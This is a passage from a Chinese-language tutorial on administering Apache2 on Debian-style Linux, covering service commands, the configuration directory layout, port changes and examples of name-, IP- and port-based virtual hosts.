<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启动Apache服务</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> start</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 停止Apache服务</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> stop</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 重启Apache服务</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 重载配置（不中断服务）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> reload</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看服务状态</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> status</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 设置开机自启</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> enable</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 取消开机自启</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> disable</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 优雅关闭（等待当前请求完成）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2ctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> graceful-stop</span></span></code></pre></figure>
<h3 id="3-快速验证">3. 快速验证<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#3-快速验证" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 浏览器访问</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">http://localhost</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">http://127.0.0.1</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">http://[本机IP]</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 命令行测试</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http://localhost</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">wget</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http://localhost</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -O</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> -</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看监听端口</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ss</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -tlnp</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span></code></pre></figure>
<h2 id="三目录结构与配置文件">三、目录结构与配置文件<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#三目录结构与配置文件" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="重要目录说明">重要目录说明<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#重要目录说明" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<pre><code>/etc/apache2/              # 主配置目录
├── apache2.conf          # 主配置文件（全局设置）
├── ports.conf            # 端口配置
├── envvars               # 环境变量
├── magic                 # MIME类型检测
├── sites-available/      # 可用站点配置
│   ├── 000-default.conf # 默认HTTP站点
│   └── default-ssl.conf # 默认HTTPS站点
├── sites-enabled/        # 已启用站点（符号链接）
├── mods-available/       # 可用模块
├── mods-enabled/         # 已启用模块
├── conf-available/       # 可用配置片段
└── conf-enabled/         # 已启用配置

/var/www/                 # Web根目录
├── html/                 # 默认网站目录
└── [其他站点目录]

/var/log/apache2/         # 日志文件目录
├── access.log           # 访问日志
├── error.log            # 错误日志
└── other_vhosts_access.log  # 其他虚拟主机日志

/usr/lib/cgi-bin/        # CGI脚本目录
/usr/share/apache2/      # Apache共享文件
</code></pre>
<h3 id="配置文件加载顺序">配置文件加载顺序<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#配置文件加载顺序" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<ol>
<li><code>apache2.conf</code> - 主配置</li>
<li><code>ports.conf</code> - 端口设置</li>
<li><code>mods-enabled/*.conf</code> - 已启用模块配置</li>
<li><code>conf-enabled/*.conf</code> - 已启用的配置片段</li>
<li><code>sites-enabled/*.conf</code> - 已启用的站点配置</li>
</ol>
<h2 id="四基础配置操作">四、基础配置操作<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#四基础配置操作" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="1-修改默认端口">1. 修改默认端口<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-修改默认端口" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 编辑端口配置文件</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/ports.conf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 修改监听端口（例如改为8080）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Listen</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8080</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 如需监听多个端口</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Listen</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 80</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Listen</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8080</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Listen</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8443</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 同时修改虚拟主机配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/sites-available/000-default.conf</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 将 &lt;VirtualHost *:80> 改为 &lt;VirtualHost *:8080></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2ctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> configtest</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 重启服务生效</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 验证端口</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> netstat</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -tlnp</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span></code></pre></figure>
<h3 id="2-配置虚拟主机基于域名">2. 配置虚拟主机（基于域名）<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-配置虚拟主机基于域名" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建网站目录</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mkdir</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/testsite/public_html</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mkdir</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/testsite/logs</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建测试页面</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">echo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;&lt;h1>Test Site&lt;/h1>&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tee</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/testsite/public_html/index.html</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 设置权限</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chown</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -R</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> www-data:www-data</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/testsite</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chmod</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -R</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 755</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/testsite</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建虚拟主机配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/sites-available/testsite.conf</span></span></code></pre></figure>
<p><strong>完整虚拟主机配置示例：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> *:80</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 基本信息</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ServerName</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> testsite.local</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ServerAlias</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> www.testsite.local</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> *.testsite.local</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ServerAdmin</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> admin@testsite.local</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 目录配置</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    DocumentRoot</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /var/www/testsite/public_html</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/testsite/public_html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Indexes FollowSymLinks MultiViews</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        AllowOverride</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> All</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all granted</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 默认索引文件</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        DirectoryIndex</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> index.html index.php</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 日志配置</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ErrorLog</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /var/www/testsite/logs/error.log</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    CustomLog</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /var/www/testsite/logs/access.log combined</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 日志级别</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    LogLevel</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> warn</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<p><strong>启用站点：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用站点</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2ensite</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> testsite.conf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 禁用站点</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2dissite</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> testsite.conf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 禁用默认站点</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2dissite</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 000-default.conf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2ctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> configtest</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 重载配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> reload</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 添加hosts记录（本地测试）</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">echo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;127.0.0.1 testsite.local&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tee</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -a</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/hosts</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试访问</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http://testsite.local</span></span></code></pre></figure>
<h3 id="3-基于ip的虚拟主机">3. 基于IP的虚拟主机<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#3-基于ip的虚拟主机" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 192.168.1.100:80</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ServerName</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> site1.example.com</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    DocumentRoot</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /var/www/site1</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 192.168.1.101:80</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ServerName</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> site2.example.com</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    DocumentRoot</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /var/www/site2</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h3 id="4-基于端口的虚拟主机">4. 基于端口的虚拟主机<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#4-基于端口的虚拟主机" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Listen</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8080</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Listen</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8081</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> *:8080</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    DocumentRoot</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /var/www/site1</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> *:8081</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    DocumentRoot</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /var/www/site2</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
